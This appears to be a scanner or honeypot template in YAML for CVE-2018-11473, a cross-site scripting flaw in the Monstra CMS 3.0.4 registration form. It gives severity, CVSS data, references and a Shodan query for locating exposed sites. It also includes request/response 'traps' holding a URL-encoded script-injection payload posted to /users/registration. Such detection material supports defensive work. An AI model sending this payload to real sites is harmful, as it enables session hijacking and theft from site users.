id: CVE-2018-11473
info:
  name: Monstra CMS 3.0.4 - Cross-Site Scripting
  author: ritikchaddha
  description: 'Monstra CMS 3.0.4 contains a cross-site scripting vulnerability via
    the registration form (i.e., the login parameter to users/registration). An attacker
    can inject arbitrary script in the browser of an unsuspecting user in the context
    of the affected site. This can allow the attacker to steal cookie-based authentication
    credentials and launch other attacks.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade to the latest version of Monstra CMS or apply the vendor-provided
    patch to fix the XSS vulnerability.

    '
  reference:
  - https://github.com/monstra-cms/monstra/issues/446
  - https://github.com/nikhil1232/Monstra-CMS-3.0.4-XSS-ON-Registration-Page
  - https://nvd.nist.gov/vuln/detail/CVE-2018-11473
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2018-11473
    cwe-id: CWE-79
    epss-score: 0.00097
    epss-percentile: 0.39534
    cpe: cpe:2.3:a:monstra:monstra:3.0.4:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: monstra
    product: monstra
    shodan-query: http.favicon.hash:419828698
  tags: cve,cve2018,xss,mostra,mostracms,cms,monstra
traps:
- request:
    method: GET
    path: /users/registration
    headers: {}
    body: ''
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: '><script>alert(document.domain)</script>Monstra'
- request:
    method: POST
    path: /users/registration
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'csrf={{csrf}}&login=test&password=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&email=teest%40gmail.com&answer=test&register=Register

      '
  response:
    status_code: 200
    headers: {}
    body: ''
